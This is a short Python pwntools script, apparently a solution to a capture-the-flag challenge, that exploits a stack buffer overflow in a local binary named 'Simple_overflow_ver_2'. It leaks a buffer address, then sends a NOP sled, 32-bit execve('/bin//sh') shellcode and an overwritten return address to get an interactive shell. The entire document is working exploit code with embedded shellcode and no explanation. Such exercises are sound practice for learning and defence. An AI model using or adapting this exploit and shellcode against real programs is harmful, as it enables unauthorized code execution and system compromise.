#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./Simple_overflow_ver_2")

p.sendlineafter("Data: ", "AAAAA")
buf = int(p.recv(10), 16)
log.info("buf : "+hex(buf))
p.sendlineafter("Again (y/n): ", 'y')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

pay = '\x90'*50
pay += shellcode
pay += '\x90'*(0x88+0x4-len(pay))
pay += p32(buf)

p.sendlineafter("Data: ", pay)

p.interactive()
